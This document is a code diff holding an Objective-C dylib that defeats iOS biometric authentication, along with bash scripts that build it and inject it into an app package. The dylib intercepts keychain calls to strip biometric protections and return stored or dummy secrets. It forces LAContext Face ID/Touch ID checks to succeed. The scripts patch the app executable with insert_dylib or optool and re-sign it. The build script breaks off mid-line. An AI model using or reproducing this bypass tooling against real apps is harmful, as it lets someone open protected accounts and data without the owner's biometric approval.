@@ -1,53 +1,317 @@
+#import <Foundation/Foundation.h>
+#import <LocalAuthentication/LocalAuthentication.h>
+#import <Security/Security.h>
+#import <objc/runtime.h>
+#import <dlfcn.h>
+
+#define DYLD_INTERPOSE(_replacement, _replacee) \
+    __attribute__((used)) static struct { const void* replacement; const void* replacee; } _interpose_##_replacee \
+    __attribute__ ((section ("__DATA,__interpose"))) = { (const void*)&_replacement, (const void*)&_replacee };
+
+// Mock store path (injected plist in app bundle)
+#define MOCK_PLIST_PATH [[NSBundle mainBundle] pathForResource:@"mock_keychain" ofType:@"plist"]
+
+// Global mock dictionary (loaded once)
+static NSMutableDictionary *mockKeychain = nil;
+static void loadMockKeychain() {
+    if (!mockKeychain) {
+        NSString *path = MOCK_PLIST_PATH;
+        NSFileManager *fm = [NSFileManager defaultManager];
+        if ([fm fileExistsAtPath:path]) {
+            mockKeychain = [NSMutableDictionary dictionaryWithContentsOfFile:path];
+        } else {
+            mockKeychain = [NSMutableDictionary dictionary];
+            [mockKeychain writeToFile:path atomically:YES];  // Create if missing
+        }
+    }
+}
+static void saveMockKeychain() {
+    [mockKeychain writeToFile:MOCK_PLIST_PATH atomically:YES];
+}
+
+// Helper: Generate unique key from query/attributes (service_account_label)
+static NSString *keyFromQuery(CFDictionaryRef dict) {
+    NSString *service = (__bridge NSString *)CFDictionaryGetValue(dict, kSecAttrService);
+    NSString *account = (__bridge NSString *)CFDictionaryGetValue(dict, kSecAttrAccount);
+    NSString *label = (__bridge NSString *)CFDictionaryGetValue(dict, kSecAttrLabel);
+    NSString *key = [NSString stringWithFormat:@"%@_%@_%@", service ?: @"default_service", account ?: @"default_account", label ?: @""];
+    return key.length > 0 ? key : nil;
+}
+
+// Helper: Is kSecClassGenericPassword?
+static BOOL isGenericPassword(CFDictionaryRef dict) {
+    CFTypeRef class = CFDictionaryGetValue(dict, kSecClass);
+    return class && CFEqual(class, kSecClassGenericPassword);
+}
+
+// Helper: Has biometric AC flags?
+static BOOL hasBiometricAC(CFDictionaryRef dict) {
+    CFTypeRef ac = CFDictionaryGetValue(dict, kSecAttrAccessControl);
+    if (ac) {
+        SecAccessControlRef sac = (SecAccessControlRef)ac;
+        CFErrorRef error = NULL;
+        SecAccessControlCreateFlags flags = SecAccessControlGetConstraints(sac);  // iOS 15+; fallback if needed
+        if (flags & (kSecAccessControlUserPresence | kSecAccessControlBiometryAny | kSecAccessControlBiometryCurrentSet)) {
+            return YES;
+        }
+    }
+    return NO;
+}
+
+// Helper: Non-biometric AC fallback
+static SecAccessControlRef createNonBiometricAC(SecAccessControlRef original) {
+    return SecAccessControlCreateWithFlags(kCFAllocatorDefault, kSecAttrAccessibleWhenUnlockedThisDeviceOnly, 0, NULL);
+}
+
+// Interpose SecItemAdd
+static OSStatus (*original_SecItemAdd)(CFDictionaryRef attributes, CFTypeRef *result);
+OSStatus interposed_SecItemAdd(CFDictionaryRef attributes, CFTypeRef *result) {
+    loadMockKeychain();
+    NSLog(@"[Mock] SecItemAdd intercepted: %@", (__bridge NSDictionary *)attributes);
+    
+    if (!isGenericPassword(attributes)) {
+        return original_SecItemAdd(attributes, result);
+    }
+    
+    NSMutableDictionary *mutableAttrs = [(__bridge NSDictionary *)attributes mutableCopy];
+    BOOL isBiometric = hasBiometricAC(attributes);
+    if (isBiometric) {
+        NSLog(@"[Mock] Biometric AC detected - stripping and mocking");
+        SecAccessControlRef newAC = createNonBiometricAC((SecAccessControlRef)CFDictionaryGetValue(attributes, kSecAttrAccessControl));
+        [mutableAttrs setObject:(__bridge id)newAC forKey:(__bridge id)kSecAttrAccessControl];
+    }
+    
+    NSString *mockKey = keyFromQuery(attributes);
+    NSData *data = mutableAttrs[(__bridge id)kSecValueData];
+    if (mockKey && data && isBiometric) {
+        mockKeychain[mockKey] = data;
+        saveMockKeychain();
+        if (result) *result = NULL;
+        return errSecSuccess;
+    }
+    
+    return original_SecItemAdd((__bridge CFDictionaryRef)mutableAttrs, result);
+}
+DYLD_INTERPOSE(interposed_SecItemAdd, SecItemAdd);
+
+// Interpose SecItemCopyMatching
+static OSStatus (*original_SecItemCopyMatching)(CFDictionaryRef query, CFTypeRef *result);
+OSStatus interposed_SecItemCopyMatching(CFDictionaryRef query, CFTypeRef *result) {
+    loadMockKeychain();
+    NSLog(@"[Mock] SecItemCopyMatching intercepted: %@", (__bridge NSDictionary *)query);
+    
+    if (!isGenericPassword(query)) {
+        return original_SecItemCopyMatching(query, result);
+    }
+    
+    OSStatus status = original_SecItemCopyMatching(query, result);
+    if (status == errSecSuccess) return status;
+    
+    BOOL isBiometric = hasBiometricAC(query);
+    if (isBiometric || status == errSecAuthFailed || status == errSecUserCanceled || status == errSecItemNotFound) {
+        NSLog(@"[Mock] Biometric failure - falling back to mock");
+        NSString *mockKey = keyFromQuery(query);
+        NSData *data = mockKeychain[mockKey];
+        if (data) {
+            if (result) *result = (__bridge_retained CFTypeRef)[data mutableCopy];  // Return copy
+            return errSecSuccess;
+        } else {
+            // Dummy fallback (customize per app)
+            if (result) *result = (__bridge_retained CFTypeRef)[@"mock_generic_password" dataUsingEncoding:NSUTF8StringEncoding];
+            return errSecSuccess;
+        }
+    }
+    return status;
+}
+DYLD_INTERPOSE(interposed_SecItemCopyMatching, SecItemCopyMatching);
+
+// Interpose SecItemUpdate
+static OSStatus (*original_SecItemUpdate)(CFDictionaryRef query, CFDictionaryRef attributesToUpdate);
+OSStatus interposed_SecItemUpdate(CFDictionaryRef query, CFDictionaryRef attributesToUpdate) {
+    loadMockKeychain();
+    NSLog(@"[Mock] SecItemUpdate intercepted: Query %@, Updates %@", (__bridge NSDictionary *)query, (__bridge NSDictionary *)attributesToUpdate);
+    
+    if (!isGenericPassword(query)) {
+        return original_SecItemUpdate(query, attributesToUpdate);
+    }
+    
+    BOOL isBiometric = hasBiometricAC(query) || hasBiometricAC(attributesToUpdate);
+    if (isBiometric) {
+        NSLog(@"[Mock] Biometric detected - updating mock");
+        NSString *mockKey = keyFromQuery(query);
+        NSData *newData = (__bridge NSData *)CFDictionaryGetValue(attributesToUpdate, kSecValueData);
+        if (mockKey && newData) {
+            mockKeychain[mockKey] = newData;
+            saveMockKeychain();
+            return errSecSuccess;
+        }
+    }
+    
+    return original_SecItemUpdate(query, attributesToUpdate);
+}
+DYLD_INTERPOSE(interposed_SecItemUpdate, SecItemUpdate);
+
+// Interpose SecItemDelete
+static OSStatus (*original_SecItemDelete)(CFDictionaryRef query);
+OSStatus interposed_SecItemDelete(CFDictionaryRef query) {
+    loadMockKeychain();
+    NSLog(@"[Mock] SecItemDelete intercepted: %@", (__bridge NSDictionary *)query);
+    
+    if (!isGenericPassword(query)) {
+        return original_SecItemDelete(query);
+    }
+    
+    BOOL isBiometric = hasBiometricAC(query);
+    if (isBiometric) {
+        NSLog(@"[Mock] Biometric detected - deleting from mock");
+        NSString *mockKey = keyFromQuery(query);
+        if (mockKey) {
+            [mockKeychain removeObjectForKey:mockKey];
+            saveMockKeychain();
+            return errSecSuccess;
+        }
+    }
+    
+    return original_SecItemDelete(query);
+}
+DYLD_INTERPOSE(interposed_SecItemDelete, SecItemDelete);
+
+// LAContext Swizzling for Non-Keychain Biometrics
+@interface LAContext (Bypass)
+- (void)swizzled_evaluatePolicy:(LAPolicy)policy localizedReason:(NSString *)reason reply:(void (^)(BOOL, NSError * _Nullable))reply;
+- (BOOL)swizzled_canEvaluatePolicy:(LAPolicy)policy error:(NSError **)error;
+@end
+
+@implementation LAContext (Bypass)
+- (void)swizzled_evaluatePolicy:(LAPolicy)policy localizedReason:(NSString *)reason reply:(void (^)(BOOL, NSError * _Nullable))reply {
+    NSLog(@"[Bypass] LAContext.evaluatePolicy forced success");
+    if (reply) reply(YES, nil);
+}
+
+- (BOOL)swizzled_canEvaluatePolicy:(LAPolicy)policy error:(NSError **)error {
+    NSLog(@"[Bypass] LAContext.canEvaluatePolicy forced YES");
+    if (error) *error = nil;
+    return YES;
+}
+
++ (void)load {
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        // Swizzle evaluatePolicy
+        Method origEval = class_getInstanceMethod([LAContext class], @selector(evaluatePolicy:localizedReason:reply:));
+        Method swizEval = class_getInstanceMethod([LAContext class], @selector(swizzled_evaluatePolicy:localizedReason:reply:));
+        method_exchangeImplementations(origEval, swizEval);
+        
+        // Swizzle canEvaluatePolicy
+        Method origCan = class_getInstanceMethod([LAContext class], @selector(canEvaluatePolicy:error:));
+        Method swizCan = class_getInstanceMethod([LAContext class], @selector(swizzled_canEvaluatePolicy:error:));
+        method_exchangeImplementations(origCan, swizCan);
+    });
+    
+    // Load original SecItem functions
+    original_SecItemAdd = dlsym(RTLD_DEFAULT, "SecItemAdd");
+    original_SecItemCopyMatching = dlsym(RTLD_DEFAULT, "SecItemCopyMatching");
+    original_SecItemUpdate = dlsym(RTLD_DEFAULT, "SecItemUpdate");
+    original_SecItemDelete = dlsym(RTLD_DEFAULT, "SecItemDelete");
+}
+@end
+
+------------------ build dylib#!/bin/bash
+
+# Config
+PROJECT_NAME="BypassDylib"
+SCHEME_NAME="BypassDylib"
+OUTPUT_DIR="./build"
+SOURCE_FILE="bypass.m"  # Your complete bypass.m from earlier
+DEPLOYMENT_TARGET="12.0"
+ARCH="arm64"
+
+# Create project if not exists (using xcodeproj for automation)
+if ! command -v xcodeproj &> /dev/null; then
+    echo "Installing xcodeproj gem..."
+    gem install xcodeproj
+fi
+
+if [ ! -d "$PROJECT_NAME.xcodeproj" ]; then
+    echo "Creating new Xcode project..."
+    mkdir -p "$PROJECT_NAME"
+    cd "$PROJECT_NAME"
+    
+    # Create source file
+    cat << EOF > $SOURCE_FILE
+// Paste the complete bypass.m code here (from previous response)
+// ... (full code as provided)
+EOF
+    
+    cd ..
+    
+    # Create project via xcodeproj
+    ruby -e "
+    require 'xcodeproj'
+    project = Xcodeproj::Project.new('$PROJECT_NAME.xcodeproj')
+    target = project.new_target(:library, '$SCHEME_NAME', :ios)
+    target.product_type = 'com.apple.product-type.library.dynamic'
+    target.add_dependency(project.new_target(:framework, 'LocalAuthentication', :ios))
+    target.add_dependency(project.new_target(:framework, 'Security', :ios))
+    target.build_configuration_list.set_setting('IPHONEOS_DEPLOYMENT_TARGET', '$DEPLOYMENT_TARGET')
+    target.build_configuration_list.set_setting('ARCHS', '$ARCH')
+    target.build_configuration_list.set_setting('SDKROOT', 'iphoneos')
+    target.build_configuration_list.set_setting('MACH_O_TYPE', 'mh_dylib')
+    source_file = project.main_group.new_file('$PROJECT_NAME/$SOURCE_FILE')
+    target.add_file_references([source_file])
+    project.save
+    "
+    
+    echo "Project created: $PROJECT_NAME.xcodeproj"
+fi
+
+# Build the dylib
+echo "Building dylib..."
+xcodebuild build \
+    -project "$PROJECT_NAME.xcodeproj" \
+    -scheme "$SCHEME_NAME" \
+    -configuration Release \
+    -destination "generic/platform=iOS" \
+    -archivePath "$OUTPUT_DIR/$SCHEME_NAME.xcarchive" \
+    archive
+
+# Extract dylib from archive
+DY
+
+------------------ run
 #!/bin/bash
 
-# Simple injection script for IPA
-INPUT_IPA="$1"
-OUTPUT_IPA="$2"
+# Usage: ./resign.sh input.ipa output.ipa entitlements.plist "Your Signing Identity"
 
-if [ $# -lt 2 ]; then
-    echo "Usage: $0 <input.ipa> <output.ipa>"
-    exit 1
-fi
+INPUT_IPA=$1
+OUTPUT_IPA=$2
+ENTITLEMENTS=$3
+SIGN_IDENTITY=$4
+DYLIB_PATH=/path/to/Bypass.dylib  # Your built dylib
+PLIST_PATH=/path/to/mock_keychain.plist  # Your provisioned plist
 
-# Create temporary directory
-TEMP_DIR="/tmp/ipa_inject_$$"
-mkdir -p "$TEMP_DIR"
+# 1. Unzip IPA
+unzip -q "$INPUT_IPA" -d temp_dir
 
-# Extract IPA
-echo "Extracting IPA..."
-unzip -q "$INPUT_IPA" -d "$TEMP_DIR"
+# 2. Find app bundle
+APP_BUNDLE=$(find temp_dir/Payload -maxdepth 1 -type d -name "*.app")
+APP_NAME=$(basename "$APP_BUNDLE")
+EXECUTABLE="$APP_BUNDLE/$(/usr/libexec/PlistBuddy -c "Print CFBundleExecutable" "$APP_BUNDLE/Info.plist")"
 
-# Find .app directory
-APP_DIR=$(find "$TEMP_DIR" -name "*.app" -type d | head -1)
-if [ -z "$APP_DIR" ]; then
-    echo "Error: No .app found"
-    exit 1
-fi
+# 3. Copy dylib and plist into app bundle
+cp "$DYLIB_PATH" "$APP_BUNDLE/Bypass.dylib"
+cp "$PLIST_PATH" "$APP_BUNDLE/mock_keychain.plist"
 
-APP_NAME=$(basename "$APP_DIR" .app)
-EXECUTABLE="$APP_DIR/$APP_NAME"
+# 4. Inject dylib load command
+insert_dylib --inplace --all-yes --weak "@executable_path/Bypass.dylib" "$EXECUTABLE"
 
-# Copy framework
-echo "Injecting framework..."
-mkdir -p "$APP_DIR/Frameworks"
-cp -r "BiometricBypass.framework" "$APP_DIR/Frameworks/"
+# 5. Resign
+codesign -f -s "$SIGN_IDENTITY" --entitlements "$ENTITLEMENTS" "$APP_BUNDLE"
 
-# Use optool to inject
-echo "Injecting load command..."
-# Download optool if not exists
-if [ ! -f "optool" ]; then
-    echo "Downloading optool..."
-    curl -L https://github.com/alexzielenski/optool/releases/download/0.1/optool.zip -o optool.zip
-    unzip optool.zip
-    chmod +x optool
-fi
+# 6. Rezip
+cd temp_dir
+zip -q -r "../$OUTPUT_IPA" *
+cd ..
+rm -rf temp_dir
 
-./optool install -c load -p "@executable_path/Frameworks/BiometricBypass.framework/BiometricBypass" -t "$EXECUTABLE"
-
-# Package back to IPA
-echo "Creating IPA..."
-cd "$TEMP_DIR"
-zip -qr "$OUTPUT_IPA" Payload/
-
-echo "Injected IPA created: $OUTPUT_IPA"
-echo "Note: You need to resign this IPA before installing!"
+echo "Resigned IPA: $OUTPUT_IPA"
